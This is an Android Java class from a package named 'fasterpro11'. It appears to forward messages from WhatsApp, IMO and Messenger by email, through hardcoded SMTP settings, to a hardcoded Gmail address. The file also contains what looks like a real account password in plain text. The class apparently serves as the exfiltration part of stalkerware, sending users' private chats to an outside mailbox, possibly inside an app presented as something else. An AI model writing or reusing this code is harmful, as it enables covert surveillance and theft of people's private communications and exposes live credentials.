package com.example.fasterpro11;

import android.util.Log;

import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class JavaMailAPI_WhatsAppIMOMessengerSender {

    public static void sendEmail(String app, String message) {
        final String username = "abontiangum99@gmail.com"; // Replace with your email username
        final String password = "egqnjvccoqtgwaxo"; // Replace with your email password

        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.example.com"); // Replace with your SMTP server
        props.put("mail.smtp.port", "587"); // Replace with your SMTP port

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {
            Message mimeMessage = new MimeMessage(session);
            mimeMessage.setFrom(new InternetAddress(username));
            mimeMessage.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse("abontiangum99@gmail.com")); // Replace with recipient's email address
            mimeMessage.setSubject("New Message from " + app);
            mimeMessage.setText("Message received from " + app + ":\n\n" + message);

            Transport.send(mimeMessage);

            System.out.println("JavaMailAPI_WhatsAppIMOMessengerSender wh_imo_mess sent successfully .");

        } catch (MessagingException e) {
            throw new RuntimeException(e);

        }
    }
}
